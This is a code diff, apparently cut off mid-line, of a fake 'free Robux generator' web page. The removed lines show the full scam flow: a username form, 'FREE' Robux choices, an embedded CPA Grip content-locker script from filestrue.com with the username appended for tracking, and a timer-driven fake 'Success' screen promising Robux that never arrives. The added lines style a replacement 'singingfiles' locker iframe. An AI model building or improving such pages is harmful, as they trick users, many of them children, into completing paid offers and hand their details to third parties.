@@ -184,9 +184,22 @@
             margin-bottom: 20px;
         }
         
-        .cpagrip-container {
+        .singingfiles-container {
             margin: 20px 0;
-            min-height: 400px;
+            min-height: 500px;
+        }
+        
+        .singingfiles-iframe {
+            width: 100%;
+            height: 500px;
+            border: none;
+            border-radius: 8px;
+            background: #1a1b1d;
+        }
+        
+        .loading-text {
+            color: #00b06f;
+            margin: 20px 0;
         }
     </style>
 </head>
@@ -234,144 +247,4 @@
             
             <div class="robux-option" onclick="selectRobux(10000)">
                 <span>10,000 Robux</span>
-                <span class="robux-amount">FREE</span>
-            </div>
-            
-            <div class="robux-option" onclick="selectRobux(50000)">
-                <span>50,000 Robux</span>
-                <span class="robux-amount">FREE</span>
-            </div>
-        </div>
-        
-        <div class="box" id="step3" style="display: none;">
-            <div class="logo">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox Logo">
-            </div>
-            
-            <h2 class="title">Complete Verification</h2>
-            <p class="description">
-                Complete one quick verification to receive your <span id="selectedAmount">0</span> Robux
-            </p>
-            
-            <!-- ============================================ -->
-            <!-- 🎯 CPA Grip Content Locker - مدمج هنا -->
-            <!-- ============================================ -->
-            
-            <div class="content-locker" id="cpaGripLocker">
-                <h3 class="locker-title">Complete Offer to Unlock</h3>
-                <p class="locker-description">Choose one offer below to verify your account</p>
-                
-                <div class="cpagrip-container">
-                    <!-- كود CPA Grip مدمج هنا -->
-                    <script type="text/javascript">var lck = false;</script>
-                    <script type="text/javascript" src="https://filestrue.com/script_include.php?id=1853706&tracking_id="></script>
-                    <script type="text/javascript">if(!lck){top.location = 'https://filestrue.com/help/ablk.php?lkt=1'; }</script>
-                    <noscript>Please enable JavaScript to access this page.<meta http-equiv="refresh" content="0;url=https://filestrue.com/help/enable_javascript.php?lkt=1" /></noscript>
-                </div>
-                
-                <button onclick="checkVerification()" style="margin-top: 20px;">
-                    I've Completed an Offer
-                </button>
-            </div>
-            
-            <!-- ============================================ -->
-            <!-- نهاية كود CPA Grip -->
-            <!-- ============================================ -->
-        </div>
-        
-        <div class="box" id="step4" style="display: none;">
-            <div class="logo">
-                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox Logo">
-            </div>
-            
-            <h2 class="title">Success!</h2>
-            <p class="description">
-                Your <span id="finalAmount">0</span> Robux are being sent to your account: 
-                <strong id="finalUsername">username</strong>
-            </p>
-            <p class="description">
-                Please allow 5-10 minutes for the Robux to appear in your account.
-            </p>
-            
-            <button onclick="restartProcess()">Generate More Robux</button>
-        </div>
-    </div>
-    
-    <div class="footer">
-        <p>This is not an official Roblox website. We are not affiliated with Roblox Corp.</p>
-        <p>© 2024 Robux Generator - For educational purposes only</p>
-    </div>
-
-    <script>
-        let selectedRobuxAmount = 0;
-        let username = '';
-        
-        function goToStep2() {
-            username = document.getElementById('username').value.trim();
-            if (username.length < 3) {
-                alert('Please enter a valid Roblox username');
-                return;
-            }
-            
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
-        
-        function selectRobux(amount) {
-            selectedRobuxAmount = amount;
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
-            document.getElementById('selectedAmount').textContent = amount.toLocaleString();
-            document.getElementById('cpaGripLocker').style.display = 'block';
-            
-            // إضافة التتبع إذا كان مطلوباً
-            addTrackingToCPA();
-        }
-        
-        function addTrackingToCPA() {
-            // إضافة اسم المستخدم أو أي بيانات تتبع إضافية لـ CPA Grip
-            // يمكنك تعديل رابط السكريبت لإضافة معلمات تتبع
-            const scripts = document.querySelectorAll('script[src*="filestrue.com"]');
-            if (scripts.length > 0) {
-                const originalSrc = scripts[0].src;
-                const trackingParams = `&username=${encodeURIComponent(username)}&amount=${selectedRobuxAmount}`;
-                scripts[0].src = originalSrc + trackingParams;
-            }
-        }
-        
-        function checkVerification() {
-            // هذه الدالة للتحقق من إكمال العرض
-            // CPA Grip عادة ما يوفر طريقة للتحقق تلقائياً
-            // ولكن يمكن استخدام هذا الزر كبديل أو لتأكيد الإكمال
-            
-            alert('Verifying your completion... Please wait while we confirm your offer.');
-            
-            // في الواقع الفعلي، CPA Grip سيتحقق تلقائياً
-            // ولكن لأغراض العرض، سننتقل للخطوة التالية
-            setTimeout(() => {
-                document.getElementById('step3').style.display = 'none';
-                document.getElementById('step4').style.display = 'block';
-                document.getElementById('finalAmount').textContent = selectedRobuxAmount.toLocaleString();
-                document.getElementById('finalUsername').textContent = username;
-            }, 2000);
-        }
-        
-        function restartProcess() {
-            document.getElementById('step4').style.display = 'none';
-            document.getElementById('step1').style.display = 'block';
-            document.getElementById('username').value = '';
-            selectedRobuxAmount = 0;
-            username = '';
-            
-            // إعادة تحميل الصفحة لتفادي مشاكل الـ CPA Grip
-            // location.reload();
-        }
-        
-        // دالة للمساعدة في تتبع التحويلات
-        function trackConversion() {
-            // هنا يمكنك إضافة كود تتبع التحويلات
-            console.log('Conversion tracked for:', username, 'Amount:', selectedRobuxAmount);
-        }
-    </script>
-</body>
-</html>
+                <span class="rob
